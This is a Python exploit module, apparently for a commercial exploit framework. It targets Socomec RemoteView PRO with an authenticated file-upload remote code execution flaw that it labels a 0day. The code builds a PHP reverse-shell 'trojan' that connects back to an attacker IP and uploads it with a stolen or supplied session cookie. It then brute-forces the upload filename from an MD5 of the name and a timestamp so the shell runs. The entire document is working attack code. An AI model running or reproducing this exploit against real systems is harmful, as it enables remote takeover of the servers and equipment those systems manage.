#!/usr/bin/env python

import urllib2
import time
import hashlib

from collections import OrderedDict
from Sploit import Sploit

from core.WebHelper import FormPoster
from shellcodes.Shellcodes import CrossOSShellcodes

INFO = {}
INFO['NAME'] = 'efa_Socomec_RemoteView_PRO_afu_rce'
INFO['DESCRIPTION'] = 'Socomec RemoteView PRO AFU RCE'
INFO['VENDOR'] = 'https://www.socomec.com/'
INFO['CVE Name'] = '0day'
INFO['DOWNLOAD_LINK'] = 'https://www.socomec.com/remote-view-software_en.html'
INFO['LINKS'] = []
INFO['CHANGELOG'] = '22 Aug 2018'
INFO['PATH'] = 'Web/'
INFO['NOTES'] = """Vulnerability allows remote attackers to upload arbitrary files to "/uploads" dir.
Authentication is required to exploit this vulnerability.
Tested against RemoteView Pro 2.0.3.1 on Windows 7 SP1 x64.
"""

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.0.10'
OPTIONS['PORT'] = 80
OPTIONS['BASEPATH'] = 'cloud/public'
OPTIONS['PHPSESSID'] = ''
OPTIONS['CONNECTBACK_IP'] = '192.168.0.16'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.basepath = self.args.get('BASEPATH', OPTIONS['BASEPATH'])
        self.phpsessid = self.args.get('PHPSESSID', OPTIONS['PHPSESSID'])
        self.connectback_ip = self.args.get('CONNECTBACK_IP', OPTIONS["CONNECTBACK_IP"])
        if self.args['listener']:
            self.listener_port = self.args['listener']['PORT']
        else:
            self.log("Please enable listener to recieve connection from remote shell")
            self.finish(False)

    def make_url(self, path=''):
        url = 'http://%s:%s/%s/%s' % (self.host, self.port, self.basepath, path)
        return url

    def generate_trojan(self):
        s = CrossOSShellcodes(self.connectback_ip, self.listener_port)
        shell = s.create_shellcode('php')
        return shell

    def run(self):
        #Get options from gui
        self.args()
        url = self.make_url()
        self.log('[*] Checking connection to %s' % url)
        urllib2.urlopen(url)
        self.log('[*] Trying to upload trojan')
        url = self.make_url('account/mapselect/id/1')
        filename = 'trojan.php'
        trojan = self.generate_trojan()
        form = FormPoster()
        form.add_field('map_type', 'static')
        form.add_file('uploadFile', filename, trojan, False)
        headers = {
            'Cookie': 'PHPSESSID=%s' % self.phpsessid
        }
        req = form.post(url, headers)
        starttime = int(time.time())
        res = urllib2.urlopen(req).read()
        if len(res) > 5:
            self.log('[-] Can\'t upload trojan')
            self.finish(False)
        # self.log('[*] Trying to guess filename')
        self.log('[*] Trying to execute trojan')
        for i in range(starttime, starttime + 10):
            m = hashlib.md5()
            m.update(filename + str(i))
            name = m.hexdigest() + '.php'
            res = urllib2.urlopen(self.make_url('upload/' + name))
            if self.is_listener_connected():
                self.finish(True)
                break
        self.finish(False)



if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()